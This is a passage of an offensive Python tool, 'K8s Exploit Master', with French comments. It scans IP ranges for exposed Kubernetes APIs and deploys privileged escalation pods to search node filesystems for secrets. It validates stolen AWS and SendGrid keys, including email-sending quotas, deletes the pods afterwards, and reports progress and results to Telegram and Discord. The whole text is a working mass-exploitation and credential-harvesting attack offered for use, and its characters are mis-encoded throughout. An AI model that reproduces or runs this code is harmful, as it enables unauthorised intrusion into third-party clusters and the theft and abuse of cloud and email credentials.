# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

    async def exploit_cluster_complete(self, cluster_endpoint: str) -> ExploitationResult:
        """Exploitation compl√®te d'un cluster"""
        
        result = ExploitationResult(
            cluster_endpoint=cluster_endpoint,
            status='started'
        )
        
        try:
            async with aiohttp.ClientSession() as session:
                self.stats['clusters_scanned'] += 1
                
                # Phase 1: Scan des pods vuln√©rables
                print(f"üîç Phase 1: Scan des pods vuln√©rables - {cluster_endpoint}")
                result.vulnerable_pods = await self.scan_vulnerable_pods(session, cluster_endpoint)
                
                # Phase 2: D√©ploiement de pod privil√©gi√©
                print(f"üöÄ Phase 2: D√©ploiement pod d'escalade - {cluster_endpoint}")
                escalation_pod = await self.deploy_escalation_pod(session, cluster_endpoint)
                
                if escalation_pod:
                    result.escalation_pods.append(escalation_pod)
                    
                    # Phase 3: Exploration du syst√®me de fichiers
                    print(f"üîç Phase 3: Exploration filesystem - {cluster_endpoint}")
                    result.credentials_found = await self.explore_pod_filesystem(
                        session, cluster_endpoint, 'default', escalation_pod
                    )
                    
                    # Phase 4: Validation des credentials
                    print(f"‚úÖ Phase 4: Validation credentials - {cluster_endpoint}")
                    await self.validate_credentials(result.credentials_found)
                    
                    # Nettoyage du pod
                    await self._cleanup_pod(session, cluster_endpoint, 'default', escalation_pod)
                    
                    result.status = 'exploited'
                    self.stats['clusters_exploited'] += 1
                    
                else:
                    result.status = 'failed_deployment'
                    result.errors.append("√âchec d√©ploiement pod privil√©gi√©")
                    
        except Exception as e:
            result.status = 'error'
            result.errors.append(str(e))
            print(f"‚ùå Erreur exploitation cluster: {str(e)}")
            
        return result

    async def _cleanup_pod(self, session: aiohttp.ClientSession,
                         cluster_endpoint: str, namespace: str, pod_name: str):
        """Nettoie le pod d√©ploy√©"""
        try:
            delete_url = f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods/{pod_name}"
            
            async with session.delete(delete_url, ssl=False, timeout=10) as response:
                if response.status in [200, 202]:
                    print(f"üßπ Pod {pod_name} supprim√©")
                else:
                    print(f"‚ö†Ô∏è √âchec suppression pod: {response.status}")
                    
        except Exception as e:
            print(f"‚ùå Erreur nettoyage pod: {str(e)}")

    def format_results_json(self, results: List[ExploitationResult]) -> str:
        """Formate les r√©sultats en JSON"""
        
        json_results = {
            "session_id": self.session_id,
            "start_time": self.start_time.isoformat(),
            "end_time": datetime.utcnow().isoformat(),
            "stats": self.stats,
            "clusters": []
        }
        
        for result in results:
            cluster_data = {
                "cluster": result.cluster_endpoint,
                "status": result.status,
                "vulnerable_pods": len(result.vulnerable_pods),
                "credentials": {}
            }
            
            # Organiser les credentials par type
            for cred in result.credentials_found:
                if cred.validated:
                    if cred.type not in cluster_data["credentials"]:
                        cluster_data["credentials"][cred.type] = []
                    
                    cluster_data["credentials"][cred.type].append({
                        "value": cred.value,
                        "validation": cred.validation_result
                    })
            
            # Ajouter des donn√©es sp√©cifiques pour AWS et SendGrid
            aws_creds = [c for c in result.credentials_found if c.type == 'aws_access_key' and c.validated]
            if aws_creds:
                aws_cred = aws_creds[0]
                cluster_data["aws"] = {
                    "access_key": aws_cred.value,
                    "SES_quota": aws_cred.validation_result.get('quota', 'unknown'),
                    "SNS_topics": aws_cred.validation_result.get('sns_topics', [])
                }
            
            sendgrid_creds = [c for c in result.credentials_found if c.type == 'sendgrid_api_key' and c.validated]
            if sendgrid_creds:
                sg_cred = sendgrid_creds[0]
                cluster_data["sendgrid"] = {
                    "api_key": sg_cred.value,
                    "quota": sg_cred.validation_result.get('quota', 'unknown'),
                    "senders": sg_cred.validation_result.get('senders', [])
                }
            
            json_results["clusters"].append(cluster_data)
        
        return json.dumps(json_results, indent=2, ensure_ascii=False)

    async def run_mass_exploitation(self, targets: List[str]) -> List[ExploitationResult]:
        """Lance l'exploitation en masse"""
        
        print(f"üöÄ D√©marrage exploitation massive - {len(targets)} cibles")
        print(f"üì± Notifications: Telegram={'‚úÖ' if self.telegram_token else '‚ùå'} "
              f"Discord={'‚úÖ' if self.discord_webhook else '‚ùå'}")
        
        # Envoyer message de d√©but
        start_message = f"""üöÄ K8s Exploit Master - SESSION START
üìÖ {datetime.utcnow().isoformat()}
üéØ Targets: {len(targets)}
üíé Session: {self.session_id}

Exploitation started! üî•"""
        
        if self.telegram_token:
            await self._send_telegram_message(start_message)
        if self.discord_webhook:
            await self._send_discord_message(start_message)
        
        # Expansion des cibles (CIDR -> IPs)
        expanded_targets = []
        for target in targets:
            if '/' in target:  # CIDR
                try:
                    from ipaddress import IPv4Network
                    network = IPv4Network(target, strict=False)
                    hosts = list(network.hosts())[:1000]  # Limite pour √©viter explosion m√©moire
                    expanded_targets.extend([str(ip) for ip in hosts])
                except Exception:
                    expanded_targets.append(target)
            else:
                expanded_targets.append(target)
        
        print(f"üéØ {len(expanded_targets)} IPs √† scanner")
        
        # Exploitation parall√®le
        results = []
        semaphore = asyncio.Semaphore(10)  # Max 10 clusters en parall√®le
        
        async def exploit_with_semaphore(target):
            async with semaphore:
                # Tester les ports communs K8s
                ports = [6443, 8443, 10250, 8080, 443, 80]
                for port in ports:
                    for protocol in ['https', 'http']:
                        cluster_endpoint = f"{protocol}://{target}:{port}"
                        
                        try:
                            # Test rapide de connectivit√©
                            async with aiohttp.ClientSession() as session:
                                async with session.get(cluster_endpoint, 
                                                     ssl=False, timeout=5) as response:
                                    if response.status in [200, 401, 403]:
                                        print(f"üéØ Cluster d√©tect√©: {cluster_endpoint}")
                                        result = await self.exploit_cluster_complete(cluster_endpoint)
                                        return result
                        except Exception:
                            continue
                
                return None
        
        # Ex√©cution des t√¢ches
        tasks = [exploit_with_semaphore(target) for target in expanded_targets]
        task_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filtrer les r√©sultats valides
        for task_result in task_results:
            if isinstance(task_result, ExploitationResult):
                results.append(task_result)
        
        # R√©sum√© final
        exploited_clusters = [r for r in results if r.status == 'exploited']
        total_credentials = sum(len([c for c in r.credentials_found if c.validated]) 
                              for r in results)
        
        summary = f"""üìä EXPLOITATION TERMIN√âE

‚úÖ Clusters exploit√©s: {len(exploited_clusters)}/{len(results)}
üîë Credentials valid√©s: {total_credentials}
üìä Statistiques:
  ‚îú‚îÄ‚îÄ Clusters scann√©s: {self.stats['clusters_scanned']}
  ‚îú‚îÄ‚îÄ Pods d√©ploy√©s: {self.stats['pods_deployed']}
  ‚îú‚îÄ‚îÄ Fichiers explor√©s: {self.stats['files_explored']}
  ‚îî‚îÄ‚îÄ Session: {self.session_id}

Duration: {datetime.utcnow() - self.start_time}"""
        
        print(summary)
        
        # Notifications finales
        if self.telegram_token:
            await self._send_telegram_message(summary)
        if self.discord_webhook:
            await self._send_discord_message(summary)
        
        return results

# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# üéØ POINT D'ENTR√âE PRINCIPAL
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

async def main():
    """Point d'entr√©e principal du module"""
    
    import argparse
    
    parser = argparse.ArgumentParser(description="üöÄ K8s Exploit Master - Autonomous Module")
    
    parser.add_argument('--targets', '-t', nargs='+', 
                       help='Cibles (IPs ou CIDRs)', required=True)
    parser.add_argument('--telegram-token', help='Token Telegram Bot')
    parser.add_argument('--telegram-chat-id', help='Chat ID Telegram')
    parser.add_argument('--discord-webhook', help='URL webhook Discord')
    parser.add_argument('--output', '-o', help='Fichier de sortie JSON')
    
    args = parser.parse_args()
    
    # Initialisation du module
    exploit_master = K8sExploitMaster(
        telegram_token=args.telegram_token,
        telegram_chat_id=args.telegram_chat_id,
        discord_webhook=args.discord_webhook
    )
    
    # Exploitation
    results = await exploit_master.run_mass_exploitation(args.targets)
    
    # Sauvegarde des r√©sultats
    json_output = exploit_master.format_results_json(results)
    
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(json_output)
        print(f"üíæ R√©sultats sauv√©s: {args.output}")
    else:
        print("\nüìÑ R√âSULTATS JSON:")
        print(json_output)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n‚èπÔ∏è Arr√™t demand√© par l'utilisateur")
    except Exception as e:
        print(f"‚ùå Erreur fatale: {str(e)}")